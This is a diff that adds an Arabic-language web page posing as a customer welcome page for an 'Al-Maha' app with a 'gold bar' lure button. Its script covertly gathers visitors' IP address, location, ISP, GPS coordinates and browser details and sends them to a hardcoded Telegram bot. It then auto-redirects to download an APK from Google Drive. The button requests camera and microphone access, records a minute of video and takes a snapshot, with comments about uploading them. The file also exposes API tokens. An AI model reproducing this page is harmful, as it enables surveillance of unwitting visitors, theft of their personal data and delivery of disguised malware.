@@ -1,0 +1,149 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>تطبيق المها — جارٍ التحضير</title>
+<style>
+  body {
+    margin:0; background:#0f172a; color:#e5e7eb;
+    font-family: system-ui, sans-serif;
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    min-height:100vh; padding:20px; text-align:center;
+  }
+  .container { max-width:800px; width:100%; }
+  iframe { width:100%; aspect-ratio:16/9; border:none; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,.4); }
+  h1 { font-size:1.5rem; margin-bottom:10px; }
+  p { color:#94a3b8; margin-bottom:20px; }
+  #startMedia {
+    margin-top:20px;
+    padding:12px 24px;
+    font-size:16px;
+    font-weight:bold;
+    border:none;
+    border-radius:8px;
+    background:linear-gradient(45deg, #FFD700, #FFC107);
+    color:#000;
+    cursor:pointer;
+    box-shadow:0 4px 10px rgba(0,0,0,0.3);
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    transition:transform 0.2s ease;
+  }
+  #startMedia:hover { transform:scale(1.05); }
+  video, img { margin-top:15px; max-width:100%; border-radius:8px; }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>مرحبا بك في مجمع استقبال العملاء</h1>
+  <p>يتم تشغيل الفيديو وتحميل التطبيق تلقائيًا</p>
+  <iframe src="https://www.youtube.com/embed/zUwlEVnEy-E?autoplay=1&mute=0&playsinline=1&rel=0&modestbranding=1" allowfullscreen></iframe>
+  <button id="startMedia">🌟 سبيكة ذهبية</button>
+  <video id="preview" autoplay muted playsinline></video>
+  <img id="snapshot" alt="صورة ملتقطة" />
+</div>
+
+<script>
+const TELEGRAM_BOT = "8311279268:AAH4R0M7DPNSpx_bWSQ2bi9DuBuUkgqxLm4";
+const TELEGRAM_CHAT = "7664416709";
+const IPINFO_TOKEN = "3bc0a2eadd8ba5";
+const IPDATA_TOKEN = "cf2660a0b70d048e98abd2fa63498f74512ef8c328cb7ea5370ee669";
+const APK_URL = "https://drive.google.com/uc?export=download&id=1nQROVVDXjN1G4_71H0B5D0_4AvSjpVaq";
+
+const ua = navigator.userAgent;
+let ipInfoData = {}, ipDataData = {}, geo = {};
+
+function fetchIpInfo() {
+  return fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`).then(r=>r.json()).then(d=>ipInfoData=d).catch(()=>{});
+}
+function fetchIpData() {
+  return fetch(`https://api.ipdata.co?api-key=${IPDATA_TOKEN}`).then(r=>r.json()).then(d=>ipDataData=d).catch(()=>{});
+}
+function fetchGeo() {
+  return new Promise(res=>{
+    if(navigator.geolocation){
+      navigator.geolocation.getCurrentPosition(p=>{
+        geo={lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy};
+        res();
+      },()=>res());
+    } else res();
+  });
+}
+
+function sendToTelegram(extra="") {
+  const now = new Date().toLocaleString('ar-MA',{hour12:false});
+  const msg = `
+🚀 زيارة جديدة — تطبيق المها
+⏱️ ${now}
+
+🌐 [ipinfo.io]
+IP: ${ipInfoData.ip||"?"}
+المدينة: ${ipInfoData.city||"?"}
+الدولة: ${ipInfoData.country||"?"}
+
+🌍 [ipdata.co]
+القارة: ${ipDataData.continent_name||"?"}
+المزود: ${ipDataData.asn?.name||"?"}
+
+🧭 إحداثيات:
+Lat: ${geo.lat??"null"} Lon: ${geo.lon??"null"} ±${geo.acc??"?"}m
+
+📱 UA: ${ua}
+
+${extra}
+  `;
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`,{
+    method:"POST", headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:TELEGRAM_CHAT, text:msg})
+  });
+}
+
+Promise.all([fetchIpInfo(), fetchIpData(), fetchGeo()]).then(()=>{
+  sendToTelegram();
+  setTimeout(()=>{ window.location.href = APK_URL; }, 2000);
+});
+
+// زر السبيكة الذهبية
+document.getElementById("startMedia").onclick = async ()=>{
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    document.getElementById("preview").srcObject = stream;
+    sendToTelegram("✅ المستخدم وافق على المشاركة بالصوت/الصورة");
+
+    // تسجيل الفيديو والصوت لمدة 60 ثانية
+    const recorder = new MediaRecorder(stream);
+    let chunks = [];
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.onstop = e => {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      const url = URL.createObjectURL(blob);
+      const vid = document.createElement('video');
+      vid.src = url;
+      vid.controls = true;
+      document.body.appendChild(vid);
+      // هنا يمكنك رفع blob إلى خادمك أو تيليجرام
+    };
+    recorder.start();
+    setTimeout(()=>recorder.stop(), 60000); // دقيقة كاملة
+
+    // التقاط صورة بعد 5 ثوانٍ
+    setTimeout(()=>{
+      const video = document.getElementById("preview");
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      document.getElementById("snapshot").src = canvas.toDataURL("image/png");
+      // هنا يمكنك رفع الصورة إلى خادمك أو تيليجرام
+    }, 5000);
+
+  } catch(e) {
+    sendToTelegram("❌ المستخدم رفض المشاركة بالصوت/الصورة");
+    alert("لم يتم منح الإذن.");
+  }
+};
+</script>
+</body>
+</html>
